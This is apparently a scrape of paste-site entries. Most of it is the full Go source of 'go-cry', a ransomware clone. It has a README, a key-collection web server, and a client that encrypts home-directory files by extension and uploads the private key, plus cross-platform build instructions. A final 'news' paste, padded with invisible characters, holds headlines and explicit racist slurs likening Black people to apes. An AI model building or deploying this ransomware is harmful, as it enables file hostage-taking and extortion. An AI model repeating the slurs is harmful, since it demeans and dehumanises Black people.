https://groups.google.com/g/comp.os.linux.misc/c/rKoEy_ycyWk
https://groups.google.com/g/alt.windows-xp/c/SRNQ3B3YHWU"
iQ2ndYPY,README,FlyFar,Email,Sunday 17th of December 2023 09:05:43 AM CDT,"go-cry
some do not seem to understand that this is not even close to being complete, and manage to build a system that processes payments for this then you are probably able to write this on their own. I could say that this was a program that encrypts some of your files and stores it on a server and you would not bother

This project was written to show how easy it is to create extremely malicious code.

Ransomware is designed to take your most loved files hostage demanding large amounts of money to unlock them.

Clone of native-tear written in Go which is a clone of hidden-tear

Building
go-cry consists of two parts, a webserver and the client software. Output files will be placed in ./bin/

Built with linker flags -w -s to minimize file size. To further reduce the size of Go binaries, please see the UPX project

Building client and webserver
$ make
Will create the files

./bin/web[.exe]
./bin/cry[.exe]
Building clients for all common operating systems and architectures
$ make all
Will create the files

./bin/windows_amd64.exe
./bin/windows_x86.exe
./bin/linux_amd64
./bin/linux_x86
./bin/macos (amd64)
Cleaning
Will remove all files in the bin directory

$ make clean
Configuring
Web server
See web/web.go and modify the constant values. They are commented and straightforward.

Client
See config.go and modify the constant values.

If modifying the RSA key size variable Bits, please see EncryptedHeaderSize. RSA ciphertext length changes depending on key size used and it is not calculated at runtime.

This program does not:
Demand any money from the user. It simply encrypts the number of files specified in config.go constant ProcessMax and sends it to the server. Encrypt your files and store your encryption key on your server.
"
7tqQtU6E,web/web.go,FlyFar,Go,Sunday 17th of December 2023 09:04:33 AM CDT,"package main

import (
	""fmt""
	""log""
	""net/http""
)

const (
	// Address server listening address
	Address = "":1312""

	// UploadRoute key uploading path
	UploadRoute = ""/upload""

	// RetrievalRoute
	RetrievalRoute = ""/retrieve""
)

// Pair private key and computer id
type Pair struct {
	Id  string
	Key string
}

// Keys stored in memory
var Keys = []Pair{}

func main() {
	http.HandleFunc(UploadRoute, handleUpload)
	http.HandleFunc(RetrievalRoute, handleRetrieve)

	fmt.Println(""Listening on"", Address)
	log.Fatal(http.ListenAndServe(Address, nil))
}

func reject(w http.ResponseWriter, r *http.Request, reason string) {
	fmt.Println(""Rejecting "", r.RemoteAddr+"":"", reason)
	w.WriteHeader(http.StatusNotFound)
	fmt.Fprint(w, http.StatusText(http.StatusNotFound))
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	id := r.PostFormValue(""i"")
	key := r.PostFormValue(""k"")

	if r.Method != ""POST"" {
		reject(w, r, ""HTTP method is not POST, got ""+r.Method)
		return
	}

	if id == """" {
		reject(w, r, ""id parameter i not set or empty"")
		return
	}

	if key == """" {
		reject(w, r, ""key parameter k is not set or empty"")
	}

	for _, pair := range Keys {
		if pair.Id == id {
			reject(w, r, ""key already exists"")
			return
		}
	}

	pair := Pair{Id: id, Key: key}
	Keys = append(Keys, pair)
}

func handleRetrieve(w http.ResponseWriter, r *http.Request) {
	id := r.PostFormValue(""i"")

	if r.Method != ""POST"" {
		reject(w, r, ""HTTP method is not POST, got ""+r.Method)
		return
	}

	if id == """" {
		reject(w, r, ""id parameter i is not set"")
		return
	}

	for _, pair := range Keys {
		if pair.Id == id {
			fmt.Fprint(w, pair.Key)
			return
		}
	}

	reject(w, r, ""no key found for id ""+id)
}"
43VG7y45,comms.go,FlyFar,Go,Sunday 17th of December 2023 09:03:59 AM CDT,"package main

import (
	""crypto/rsa""
	""io""
	""net/http""
	""net/url""
)

// PostKey sends the private key to the remote serrver
func PostKey(priv *rsa.PrivateKey, id string) error {
	key := Stringify(priv)

	_, err := http.PostForm(UploadEndpoint, url.Values{
		""k"": {key},
		""i"": {id},
	})

	return err
}

func GetKey(id string) (*rsa.PrivateKey, error) {
	req, err := http.PostForm(RetrieveEndpoint, url.Values{
		""i"": {id},
	})

	if err != nil {
		return nil, err
	}

	key := make([]byte, req.ContentLength)

	io.ReadFull(req.Body, key)

	priv, err := DecodeKey(key)

	return priv, err
}"
2Zsbzzrd,comms_test.go,FlyFar,Go,Sunday 17th of December 2023 09:03:17 AM CDT,"package main

import (
	""fmt""
	""testing""
)

func TestComms(t *testing.T) {
	fmt.Println(""Generating key..."")

	priv := Generate()
	str := Stringify(priv)
	fmt.Println(str)

	fmt.Println(""Uploading..."")
	err := PostKey(priv)

	if err != nil {
		panic(err)
	}

	fmt.Println(""Key uploaded"")

	fmt.Println(""Retrieving key..."")
	priv, err = GetKey()

	if err != nil {
		panic(err)
	}

	fmt.Println(Stringify(priv))
}

func TestServer(t *testing.T) {
	fmt.Println(""Sending the same key twice..."")
	priv := Generate()
	PostKey(priv)
	PostKey(priv)
}"
T4KD9qpa,config.go,FlyFar,Go,Sunday 17th of December 2023 09:02:02 AM CDT,"package main

// Extensions to walk
var Extensions = [...]string{
	""txt"",
	""doc"",
	""docx"",
	""xls"",
	""xlsx"",
	""ppt"",
	""pptx"",
	""odt"",
	""jpg"",
	""png"",
	""csv"",
	""sql"",
	""mdb"",
	""sln"",
	""php"",
	""asp"",
	""aspx"",
	""html"",
	""xml"",
	""psd"",
}

// IgnoreDirs will skip directories that contains the string
var IgnoreDirs = [...]string{
	""AppData"",
	""."",
}

const (
	// LockedExtension to append to file name when encrypted
	LockedExtension = "".locked""

	// ProcessMax X files, then stop
	ProcessMax int = 1

	// KeySize in bytes (AES-256)
	KeySize int = 32

	// Bits Keypair bit size (higher = exponentially slower)
	Bits int = 1024

	// EncryptedHeaderSize I don't know how to calculate the length of RSA ciphertext, but with KeySize + aes.BlockSize it'll be 128 bytes
	// Check this if changing AES keysize or RSA bit size
	EncryptedHeaderSize int = 128

	// Endpoint web server URL
	UploadEndpoint = ""http://localhost:1312/upload""

	RetrieveEndpoint = ""http://localhost:1312/retrieve""
)"
cNYLBPbi,crypto_test.go,FlyFar,Go,Sunday 17th of December 2023 09:01:33 AM CDT,"package main

import (
	""testing""
)

func TestCrypto(t *testing.T) {
	file := ""test.docx""
	priv := Generate()

	encrypt(file, priv)
	decrypt(file+LockedExtension, priv)
}"
Z90mdxUd,decrypt.go,FlyFar,Go,Sunday 17th of December 2023 09:00:54 AM CDT,"package main

import (
	""crypto/aes""
	""crypto/cipher""
	""crypto/rand""
	""crypto/rsa""
	""io/ioutil""

	""crypto/sha256""

	""strings""
)

func decrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	header := data[:EncryptedHeaderSize]
	label := []byte("""")

	header, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, header, label)

	if err != nil {
		panic(err)
	}

	key := header[:KeySize]
	iv := header[KeySize : KeySize+aes.BlockSize]

	data = data[EncryptedHeaderSize:]

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBDecrypter(block, iv)
	cipher.XORKeyStream(data, data)

	if strings.HasSuffix(file, LockedExtension) {
		file = file[:len(file)-len(LockedExtension)]
	}

	ioutil.WriteFile(file, data, 0777) // TODO
}"
htq32aQr,encrypt.go,FlyFar,Go,Sunday 17th of December 2023 09:00:24 AM CDT,"package main

import (
	""crypto/rsa""
	""io/ioutil""

	""crypto/aes""
	""crypto/rand""

	""crypto/cipher""

	""crypto/sha256""
)

func encrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	key := make([]byte, KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)
	pub := priv.PublicKey

	label := []byte("""")
	header, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, &pub, header, label)

	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBEncrypter(block, iv)
	cipher.XORKeyStream(data, data)

	data = append(header, data...)

	ioutil.WriteFile(file+LockedExtension, data, 0777)
}"
vW0VEibn,home_unix.go,FlyFar,Go,Sunday 17th of December 2023 08:59:58 AM CDT,"// +build !windows

package main

import (
	""os""
)

func GetHomeDir() string {
	return os.Getenv(""HOME"")
}"
JzUymvWV,home_windows.go,FlyFar,Go,Sunday 17th of December 2023 08:59:21 AM CDT,"package main

import (
	""os""
)

func GetHomeDir() string {
	home := os.Getenv(""HOMEDRIVE"") + os.Getenv(""HOMEPATH"")

	if home == """" {
		home = os.Getenv(""USERPROFILE"")
	}

	return home
}"
dqCSfJMw,keys.go,FlyFar,Go,Sunday 17th of December 2023 08:58:42 AM CDT,"package main

import (
	""crypto/rand""
	""crypto/rsa""
	""crypto/x509""
	""encoding/pem""
)

// Generate new RSA keypair
func Generate() *rsa.PrivateKey {
	priv, err := rsa.GenerateKey(rand.Reader, Bits)

	if err != nil {
		panic(err)
	}

	return priv
}

// Stringify private key
func Stringify(priv *rsa.PrivateKey) string {
	privateKeyDer := x509.MarshalPKCS1PrivateKey(priv)
	privateKeyBlock := pem.Block{
		Type:    ""RSA PRIVATE KEY"",
		Headers: nil,
		Bytes:   privateKeyDer,
	}

	return string(pem.EncodeToMemory(&privateKeyBlock))
}

// DecodeKey
func DecodeKey(key []byte) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(key))

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)

	return priv, err
}"
HrqeTwbz,main.go,FlyFar,Go,Sunday 17th of December 2023 08:58:04 AM CDT,"package main

import (
	""fmt""

	""crypto/rand""
	""crypto/rsa""
	""crypto/sha256""
	""encoding/hex""
	""io/ioutil""
	""os""
	""strings""
)

// GenerateID generates the unique identifier
func GenerateID() string {
	r := make([]byte, 32)
	rand.Read(r)

	hash := sha256.New()

	return hex.EncodeToString(hash.Sum(r))
}

func main() {
	idFile, err := os.Open(""id.txt"")

	var priv *rsa.PrivateKey

	shouldEncrypt := false

	// File exists, read id and get key from server
	if err == nil {
		idBytes, err := ioutil.ReadAll(idFile)
		idFile.Close()

		if err != nil {
			panic(err)
		}

		id := string(idBytes)
		id = strings.Split(id, ""\r\n"")[1]

		GetKey(id)
	} else {
		fmt.Println(""generating keypair..."")
		priv = Generate()
		shouldEncrypt = true
	}

	fmt.Println()
	fmt.Println(Stringify(priv))

	startWalk := GetHomeDir()

	Walk(startWalk, func(filePath string, fileInfo os.FileInfo, isEncrypted bool) {
		fmt.Println(filePath, ""encrypted"", isEncrypted)

		if shouldEncrypt && !isEncrypted {
			encrypt(filePath, priv)
		} else if isEncrypted {
			decrypt(filePath, priv)
		}
	})

	if shouldEncrypt {
		id := GenerateID()

		PostKey(priv, id)

		data := ""# Do not modify this file, it contains your ID matching the encryption key\r\n"" + id

		ioutil.WriteFile(""id.txt"", []byte(data), 0777)
	}
}"
nFfemXRN,makefile,FlyFar,Make,Sunday 17th of December 2023 08:57:20 AM CDT,"BUILD=go build -ldflags=""-w -s""

default: build

build:
	@echo ""Building cry...""
	$(BUILD) -o bin/cry.exe
	@echo ""Building server...""
	cd web/ && $(BUILD) -o ../bin/web.exe

clean:
	@rm -rf bin/
	@rm -f debug debug.test web/debug web/debug.test

all:
	GOOS=windows GOARCH=amd64 $(BUILD) -o bin/windows_amd64.exe
	GOOS=windows GOARCH=386 $(BUILD) -o bin/windows_x86.exe
	GOOS=linux GOARCH=amd64 $(BUILD) -o bin/linux_amd64
	GOOS=linux GOARCH=386 $(BUILD) -o bin/linux_x86
	GOOS=darwin GOARCH=amd64 $(BUILD) -o bin/macos"
d1X412Wd,walker.go,FlyFar,Go,Sunday 17th of December 2023 08:55:55 AM CDT,"package main

import (
	""fmt""
	""os""
	""path/filepath""
	""strings""
)

// Walk recursively walks the input directory and applies all rules (extensions, limits etc)
func Walk(startPath string, callback func(filePath string, fileInfo os.FileInfo, isEncrypted bool)) {
	var count int
	filepath.Walk(startPath, func(filePath string, fileInfo os.FileInfo, err error) error {
		if err != nil {
			fmt.Println(""error"", err.Error())
			return nil
		}

		var proceed bool
		for _, v := range Extensions {
			if strings.HasSuffix(filePath, v) || strings.HasSuffix(filePath, LockedExtension) {
				proceed = true
				break
			}
		}

		for _, v := range IgnoreDirs {
			if strings.Contains(filepath.Dir(filePath), v) {
				proceed = false
				break
			}
		}

		if proceed && count < ProcessMax {
			count++

			isEncrypted := strings.HasSuffix(filePath, LockedExtension)

			callback(filePath, fileInfo, isEncrypted)
		}

		return nil
	})
}"
U00aASLc,News Dec17 23,Newscaster_Ned,Email,Sunday 17th of December 2023 08:53:06 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

O‎h‎,‎ ‎c‎o‎m‎e‎ ‎o‎n‎,‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎S‎n‎y‎d‎e‎r‎.‎ ‎L‎e‎t‎ ‎m‎e‎ ‎g‎o‎ ‎b‎a‎c‎k‎.‎.‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎

I‎s‎r‎a‎e‎l‎ ‎P‎u‎l‎l‎s‎ ‎I‎t‎s‎e‎l‎f‎ ‎T‎o‎g‎e‎t‎h‎e‎r‎ ‎A‎f‎t‎e‎r‎ ‎H‎o‎r‎r‎o‎r‎ ‎o‎f‎ ‎3‎ ‎H‎o‎s‎t‎a‎g‎e‎ ‎D‎e‎a‎t‎h‎s‎,‎ ‎a‎n‎d‎ ‎F‎i‎g‎h‎t‎s‎ ‎O‎n‎
P‎e‎n‎n‎s‎y‎l‎v‎a‎n‎i‎a‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎ ‎D‎e‎c‎l‎a‎r‎e‎ ‎2‎0‎2‎3‎ ‎t‎h‎e‎ ‎Y‎e‎a‎r‎ ‎o‎f‎ ‎T‎a‎y‎l‎o‎r‎ ‎S‎w‎i‎f‎t‎
'‎G‎r‎e‎y‎'‎s‎ ‎A‎n‎a‎t‎o‎m‎y‎'‎ ‎a‎n‎d‎ ‎'‎G‎e‎n‎e‎r‎a‎l‎ ‎H‎o‎s‎p‎i‎t‎a‎l‎'‎ ‎A‎c‎t‎o‎r‎ ‎J‎a‎c‎k‎ ‎A‎x‎e‎l‎r‎o‎d‎ ‎D‎i‎e‎s‎ ‎a‎t‎ ‎9‎3‎
C‎h‎e‎r‎ ‎S‎l‎a‎m‎s‎ ‎R‎o‎c‎k‎ ‎&‎ ‎R‎o‎l‎l‎ ‎H‎a‎l‎l‎ ‎o‎f‎ ‎F‎a‎m‎e‎:‎ ‎W‎o‎u‎l‎d‎n‎'‎t‎ ‎J‎o‎i‎n‎ ‎i‎f‎ ‎T‎h‎e‎y‎ ‎G‎a‎v‎e‎ ‎M‎e‎ ‎$‎1‎M‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
V‎i‎c‎t‎i‎c‎r‎a‎t‎

S‎e‎n‎a‎t‎e‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎W‎h‎o‎ ‎F‎i‎l‎m‎e‎d‎ ‎G‎a‎y‎ ‎S‎e‎x‎ ‎T‎a‎p‎e‎ ‎C‎r‎i‎e‎s‎ ‎H‎o‎m‎o‎p‎h‎o‎b‎i‎a‎
S‎e‎n‎a‎t‎e‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎W‎h‎o‎ ‎F‎i‎l‎m‎e‎d‎ ‎G‎a‎y‎ ‎S‎e‎x‎ ‎T‎a‎p‎e‎ ‎C‎r‎i‎e‎s‎ ‎H‎o‎m‎o‎p‎h‎o‎b‎i‎a‎
6‎,‎7‎0‎5‎
P‎i‎n‎k‎e‎r‎t‎o‎n‎:‎ ‎W‎h‎e‎n‎ ‎I‎t‎ ‎C‎o‎m‎e‎s‎ ‎t‎o‎ ‎V‎o‎t‎e‎r‎ ‎F‎r‎a‎u‎d‎,‎ ‎I‎t‎'‎s‎ ‎W‎h‎o‎ ‎C‎o‎u‎n‎t‎s‎ ‎T‎h‎a‎t‎ ‎C‎o‎u‎n‎t‎s‎
P‎i‎n‎k‎e‎r‎t‎o‎n‎:‎ ‎W‎h‎e‎n‎ ‎I‎t‎ ‎C‎o‎m‎e‎s‎ ‎t‎o‎ ‎V‎o‎t‎e‎r‎ ‎F‎r‎a‎u‎d‎,‎ ‎I‎t‎'‎s‎ ‎W‎h‎o‎ ‎C‎o‎u‎n‎t‎s‎ ‎T‎h‎a‎t‎ ‎C‎o‎u‎n‎t‎s‎
3‎9‎8‎

D‎e‎m‎o‎c‎r‎a‎t‎ ‎S‎e‎n‎a‎t‎o‎r‎ ‎F‎i‎r‎e‎s‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎W‎h‎o‎ ‎F‎i‎l‎m‎e‎d‎ ‎G‎a‎y‎ ‎S‎e‎x‎ ‎E‎s‎c‎a‎p‎a‎d‎e‎ ‎i‎n‎ ‎H‎e‎a‎r‎i‎n‎g‎ ‎R‎o‎o‎m‎
6‎,‎7‎7‎2‎
T‎r‎u‎m‎p‎ ‎P‎l‎e‎d‎g‎e‎s‎ ‎‘‎E‎c‎o‎n‎o‎m‎i‎c‎ ‎B‎o‎o‎m‎’‎ ‎B‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎‘‎I‎n‎s‎t‎a‎n‎t‎’‎ ‎H‎e‎ ‎W‎i‎n‎s‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎c‎y‎
T‎r‎u‎m‎p‎ ‎P‎l‎e‎d‎g‎e‎s‎ ‎‘‎E‎c‎o‎n‎o‎m‎i‎c‎ ‎B‎o‎o‎m‎’‎ ‎B‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎‘‎I‎n‎s‎t‎a‎n‎t‎’‎ ‎H‎e‎ ‎W‎i‎n‎s‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎c‎y‎
9‎5‎3‎
R‎o‎n‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎C‎h‎a‎l‎l‎e‎n‎g‎e‎s‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎D‎e‎b‎a‎t‎e‎ ‎A‎h‎e‎a‎d‎ ‎o‎f‎ ‎I‎o‎w‎a‎ ‎C‎a‎u‎c‎u‎s‎
R‎o‎n‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎C‎h‎a‎l‎l‎e‎n‎g‎e‎s‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎D‎e‎b‎a‎t‎e‎ ‎A‎h‎e‎a‎d‎ ‎o‎f‎ ‎I‎o‎w‎a‎ ‎C‎a‎u‎c‎u‎s‎
9‎3‎0‎
S‎e‎c‎u‎r‎i‎t‎y‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎:‎ ‎E‎u‎r‎o‎p‎e‎ ‎i‎s‎ ‎'‎E‎n‎t‎e‎r‎i‎n‎g‎ ‎a‎n‎ ‎E‎r‎a‎ ‎o‎f‎ ‎W‎a‎r‎s‎'‎
S‎e‎c‎u‎r‎i‎t‎y‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎:‎ ‎E‎u‎r‎o‎p‎e‎ ‎i‎s‎ ‎'‎E‎n‎t‎e‎r‎i‎n‎g‎ ‎a‎n‎ ‎E‎r‎a‎ ‎o‎f‎ ‎W‎a‎r‎s‎'‎
1‎5‎3‎
G‎o‎v‎.‎ ‎S‎u‎n‎u‎n‎u‎:‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎I‎s‎ ‎G‎o‎i‎n‎g‎ ‎T‎o‎ ‎B‎e‎ ‎t‎h‎e‎ ‎G‎O‎P‎ ‎N‎o‎m‎i‎n‎e‎e‎
G‎o‎v‎.‎ ‎S‎u‎n‎u‎n‎u‎:‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎I‎s‎ ‎G‎o‎i‎n‎g‎ ‎T‎o‎ ‎B‎e‎ ‎t‎h‎e‎ ‎G‎O‎P‎ ‎N‎o‎m‎i‎n‎e‎e‎
2‎,‎8‎5‎0‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎U‎.‎S‎.‎ ‎Y‎o‎u‎n‎g‎ ‎P‎e‎o‎p‎l‎e‎,‎ ‎1‎8‎-‎2‎4‎,‎ ‎W‎a‎n‎t‎ ‎t‎o‎ ‎E‎n‎d‎ ‎I‎s‎r‎a‎e‎l‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎U‎.‎S‎.‎ ‎Y‎o‎u‎n‎g‎ ‎P‎e‎o‎p‎l‎e‎,‎ ‎1‎8‎-‎2‎4‎,‎ ‎W‎a‎n‎t‎ ‎t‎o‎ ‎E‎n‎d‎ ‎I‎s‎r‎a‎e‎l‎
4‎3‎7‎
G‎r‎a‎p‎h‎i‎c‎ ‎V‎i‎d‎e‎o‎:‎ ‎S‎e‎n‎a‎t‎e‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎C‎a‎u‎g‎h‎t‎ ‎F‎i‎l‎m‎i‎n‎g‎ ‎G‎a‎y‎ ‎S‎e‎x‎ ‎T‎a‎p‎e‎ ‎i‎n‎ ‎S‎e‎n‎a‎t‎e‎ ‎R‎o‎o‎m‎
G‎r‎a‎p‎h‎i‎c‎ ‎V‎i‎d‎e‎o‎:‎ ‎S‎e‎n‎a‎t‎e‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎C‎a‎u‎g‎h‎t‎ ‎F‎i‎l‎m‎i‎n‎g‎ ‎G‎a‎y‎ ‎S‎e‎x‎ ‎T‎a‎p‎e‎ ‎i‎n‎ ‎S‎e‎n‎a‎t‎e‎ ‎R‎o‎o‎m‎
1‎4‎,‎1‎2‎5‎
B‎o‎s‎t‎o‎n‎ ‎M‎a‎y‎o‎r‎ ‎M‎i‎c‎h‎e‎l‎l‎e‎ ‎W‎u‎ ‎P‎o‎s‎t‎s‎ ‎P‎h‎o‎t‎o‎ ‎f‎r‎o‎m‎ ‎N‎o‎-‎W‎h‎i‎t‎e‎s‎-‎A‎l‎l‎o‎w‎e‎d‎ ‎H‎o‎l‎i‎d‎a‎y‎ ‎P‎a‎r‎t‎y‎
B‎o‎s‎t‎o‎n‎ ‎M‎a‎y‎o‎r‎ ‎M‎i‎c‎h‎e‎l‎l‎e‎ ‎W‎u‎ ‎P‎o‎s‎t‎s‎ ‎P‎h‎o‎t‎o‎ ‎f‎r‎o‎m‎ ‎N‎o‎-‎W‎h‎i‎t‎e‎s‎-‎A‎l‎l‎o‎w‎e‎d‎ ‎H‎o‎l‎i‎d‎a‎y‎ ‎P‎a‎r‎t‎y‎

N‎i‎g‎g‎a‎ ‎C‎a‎r‎e‎e‎r‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎ ‎M‎o‎n‎k‎n‎o‎i‎d‎ ‎B‎u‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎M‎e‎t‎r‎o‎C‎a‎r‎d‎ ‎T‎h‎e‎f‎t‎.‎

Y‎'‎a‎l‎l‎ ‎w‎a‎n‎t‎ ‎a‎n‎y‎ ‎n‎e‎w‎ ‎V‎i‎s‎a‎s‎,‎ ‎n‎i‎g‎g‎a‎?‎


B‎a‎l‎t‎i‎m‎o‎r‎e‎ ‎B‎a‎b‎o‎o‎n‎ ‎S‎h‎o‎o‎t‎s‎ ‎u‎p‎ ‎C‎h‎u‎r‎c‎h‎ ‎w‎i‎t‎h‎ ‎T‎o‎d‎d‎l‎e‎r‎ ‎i‎n‎ ‎H‎i‎s‎ ‎C‎a‎r‎.‎


M‎o‎n‎k‎e‎y‎ ‎M‎a‎n‎ ‎S‎e‎t‎s‎ ‎A‎b‎l‎a‎z‎e‎ ‎P‎o‎l‎i‎c‎e‎ ‎C‎r‎u‎i‎s‎e‎r‎.‎


F‎a‎t‎ ‎G‎o‎r‎i‎l‎l‎a‎ ‎S‎t‎e‎a‎l‎s‎ ‎B‎u‎d‎ ‎L‎i‎t‎e‎ ‎f‎r‎o‎m‎ ‎A‎r‎l‎i‎n‎g‎t‎o‎n‎ ‎C‎o‎n‎v‎e‎n‎i‎e‎n‎c‎e‎ ‎S‎t‎o‎r‎e‎.‎


W‎o‎m‎a‎n‎ ‎F‎o‎u‎n‎d‎ ‎D‎e‎a‎d‎ ‎i‎n‎ ‎S‎a‎n‎t‎a‎ ‎A‎n‎a‎ ‎H‎o‎t‎e‎l‎ ‎R‎o‎o‎m‎ ‎A‎f‎t‎e‎r‎ ‎C‎h‎i‎m‎p‎ ‎K‎i‎l‎l‎s‎ ‎H‎e‎r‎.‎


M‎o‎n‎k‎e‎y‎ ‎S‎m‎a‎s‎h‎e‎s‎ ‎N‎J‎ ‎P‎a‎w‎n‎ ‎S‎h‎o‎p‎ ‎w‎i‎t‎h‎ ‎T‎i‎r‎e‎ ‎I‎r‎o‎n‎.‎


M‎a‎s‎s‎a‎c‎h‎u‎s‎e‎t‎t‎s‎ ‎G‎r‎o‎i‎d‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎H‎u‎m‎a‎n‎ ‎T‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎.‎


G‎r‎e‎e‎n‎v‎i‎l‎l‎e‎ ‎P‎o‎l‎i‎c‎e‎ ‎A‎r‎r‎r‎e‎s‎t‎ ‎D‎a‎r‎k‎ ‎A‎p‎e‎ ‎W‎h‎o‎ ‎S‎m‎a‎s‎h‎e‎d‎ ‎T‎V‎ ‎O‎v‎e‎r‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎H‎e‎a‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
S‎u‎n‎n‎y‎
7‎1‎°‎
/‎4‎1‎°‎
1‎%‎
S‎W‎ ‎6‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎7‎ ‎|‎ ‎D‎a‎y‎
7‎1‎°‎
1‎%‎
S‎W‎
6‎
 ‎
m‎p‎h‎
S‎u‎n‎n‎y‎.‎ ‎H‎i‎g‎h‎ ‎7‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎W‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
4‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
4‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎1‎9‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
5‎:‎3‎3‎ ‎p‎m‎
S‎u‎n‎ ‎1‎7‎ ‎|‎ ‎N‎i‎g‎h‎t‎
4‎1‎°‎
4‎%‎
W‎S‎W‎
6‎
 ‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎4‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎1‎:‎3‎3‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎0‎:‎4‎6‎ ‎p‎m‎
M‎o‎n‎ ‎1‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
6‎8‎°‎
/‎3‎7‎°‎
4‎%‎
N‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎9‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎8‎°‎
4‎%‎
E‎S‎E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎2‎°‎
/‎5‎7‎°‎
1‎3‎%‎
S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎1‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎2‎°‎
/‎6‎0‎°‎
4‎2‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎2‎
S‎h‎o‎w‎e‎r‎s‎
7‎2‎°‎
/‎5‎9‎°‎
5‎1‎%‎
S‎S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎3‎
